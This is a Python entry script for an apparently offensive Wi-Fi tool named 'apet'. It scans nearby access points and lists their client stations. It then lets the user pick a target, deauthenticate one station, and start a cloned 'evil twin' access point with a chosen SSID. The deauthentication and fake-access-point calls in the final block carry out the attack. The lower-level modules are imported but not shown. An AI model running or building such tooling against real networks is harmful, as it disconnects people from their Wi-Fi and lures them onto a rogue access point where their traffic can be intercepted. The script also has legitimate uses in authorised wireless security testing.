import argparse as ap
import signal
import sys
import pyric.pyw as pyw
import os
import ap_collector as apc
import util
import nic_manager
import twin_manager
import cleanup_coordinator
from yaspin import yaspin


def get_nics():
    nics = pyw.winterfaces()
    print(util.UNDERLINE + "You can find below the available NICs:\n" + util.ENDC)
    index = 1
    for el in nics:    
        print(util.BOLD + str(index) + "- " + el + util.ENDC)
        index+=1

def collect_aps(obj):
    with yaspin(text="Collecting APS", color="cyan") as spinner:
        obj.sniff_beacon_frame()
        spinner.ok("✅")
        print()
        
def collect_stations(obj, ap_id):
    with yaspin(text="Collecting Stations", color="cyan") as spinner:
        obj.sniff_data_frame(int(ap_id))
        spinner.ok("✅")
        print()
    
if __name__ == "__main__":
    util.print_banner()
    cc = cleanup_coordinator.CleanupCoordinator()
    signal.signal(signal.SIGINT, util.signal_handler_factory(cc)) 
    parser = ap.ArgumentParser(
        prog="apet",
        description="APAT retrieve the nearby available access points and provide the possibility to clone one of them.")
    parser.add_argument(
        "-l",
        "--list",
        action="store_true",
        help="List available network interfaces."
    )
    parser.add_argument("-mi",
        "--mon_interface",
        help="The network interface to use for scanning and deauth attack."
    )
    parser.add_argument("-s",
        "--scan",
        action="store_true",
        help="Scan on multiple channel to retrieve the nearby access points."
    )
    parser.add_argument("-et",
        "--evil_twin",
        action="store_true",
        help="Execute the evil-twin attack."
    )
    parser.add_argument("-tid",
        "--twin_ssid",
        help="The SSID to use for the evil-twin attack."
    )
    parser.add_argument("-ai",
        "--ap_interface",
        help="The network interface to use to spawn the twin AP."
    )
    args = parser.parse_args()
    
    if args.list:
        get_nics()
        sys.exit(1)

    if os.geteuid() != 0:
        parser.error("You need to be root to perform this operations!") 

    nicm = nic_manager.NicManager()
    cc.register(nicm, 100)

    if args.mon_interface and not (args.scan or args.evil_twin):
        parser.error("The -mi option requires at least one of the following options:\n\t 1. --scan\n\t 2. --evil_twin\n")
    if args.ap_interface and not args.evil_twin:
        parser.error("The -ai option requires the --evil_twin option.")
        
    if args.scan and not args.mon_interface:
        parser.error("The --scan option requires the -mi option.")

    if args.evil_twin and not (args.ap_interface and args.twin_ssid):
        parser.error("The --evil_twin option requires the options -ai and -tid")

    if args.mon_interface:
        nicm.setup_mon_nic(args.mon_interface)

    if args.ap_interface:
        nicm.setup_ap_nic(args.ap_interface)
        
    if args.scan:
        try:
            ap_collector = apc.APCollector(nicm)
            collect_aps(ap_collector)
            nicm.cleanup()
            sys.exit(1)
        except Exception:
            cc.cleanup_all()

    if args.evil_twin:
        try:
            twinm = twin_manager.TwinManager(args.twin_ssid, nicm)
            cc.register(twinm, 1)
            ap_collector = apc.APCollector(nicm)
            collect_aps(ap_collector)
            ap_count = ap_collector.aps_count()
            if ap_count == 0:
                print("[*] No access point detected! Exit ... ")
                cc.cleanup_all()
                sys.exit(1)
            sel = False
            while(not sel):
                ap_id = input("Please, select the target AP to start the stations collections: ")
                if ap_id is not None and (0 <= int(ap_id) < ap_count):
                    sel = True
                else:
                    print("[*] Bad selection! Please retry with a valid access point id ...")
            collect_stations(ap_collector, ap_id)
            station_count = ap_collector.st_count(int(ap_id))
            if station_count == 0:
                print("[*] No stations detected for the selected access point! Exit ... ")
                cc.cleanup_all()
                sys.exit(1)
            sel = False
            while(not sel):
                station_id = input("Please, select a valid station id to deauthenticate for evil twin attack: ")
                if 0 <= int(station_id) < station_count:
                    sel = True
                else:
                    print("[*] Bad selection! Please retry with a valid station id ...")
            selected_ap = ap_collector.get_ap_data(int(ap_id))
            nicm.set_channel(selected_ap[util.CHANNEL][0], util.NIC_MON)
            ap_mac = selected_ap[util.BSSID]
            st_mac = selected_ap[util.STATIONS][int(station_id)]
            nicm.set_address(util.NIC_AP)
            twinm.build_ap_conf()
            twinm.start_deauth_attack(ap_mac, st_mac)
            twinm.start_fake_ap()
        except Exception:
            cc.cleanup_all()

